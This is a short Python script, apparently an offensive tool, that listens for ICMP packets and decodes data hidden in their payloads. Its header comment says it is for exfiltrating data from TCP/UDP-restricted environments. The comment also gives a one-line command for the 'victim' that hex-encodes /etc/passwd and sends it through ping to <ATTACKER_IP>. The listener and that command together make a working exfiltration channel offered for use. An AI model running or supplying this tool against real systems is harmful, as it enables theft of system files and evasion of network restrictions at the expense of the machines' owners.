# this is a script to listen icmp packets and decode data in them
# can be used to exfiltrate data in TCP/UDP restricted environments
#
# usage:
# python3 icmp_exfil_listener.py
# 
# then launch a command on victim:
#  cat /etc/passwd | xxd -p -c 16 | while read line; do ping -c 1 -p $line <ATTACKER_IP>; done
#

import socket

def recv():
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    while True:
        data, src = s.recvfrom(1508)
        payload = data[44:60]
        try:
            print(payload.decode('utf-8'), end='', flush=True)
        except:
            pass

if __name__ == '__main__':
    recv()
